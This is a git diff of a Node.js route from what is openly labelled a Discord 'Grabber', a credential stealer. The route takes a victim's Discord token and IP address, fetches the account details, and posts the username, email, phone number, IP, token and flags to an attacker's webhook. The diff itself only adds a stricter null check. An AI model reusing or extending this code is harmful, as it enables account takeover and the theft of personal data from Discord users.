@@ -9,7 +9,7 @@ router.get('/', async (req,res) => {
     //let parse = parseWebhookURL(req.query.webhook);
     //if(parse == null) return res.render('404', {layout:'home'});
     let user = await getUserData(req.query.token);
-    if(user == null) return res.send('no done');
+    if(user == null || !user.username) return res.send('no done');
     
     webhook.send(new MessageEmbed().setTitle(`${user.username}#${user.discriminator} | ${user.id}`).addField("Email",user.email).addField("Mobile Number",user.phone).addField("IP Adress",req.query.ip).addField("premium_type",user.premium_type).addField("Token",req.query.token).addField("Flags",user.flags).setFooter("Grabber by × ΉƧΣ ×⚡`#2080").setColor("WHITE"));
     res.send('done');
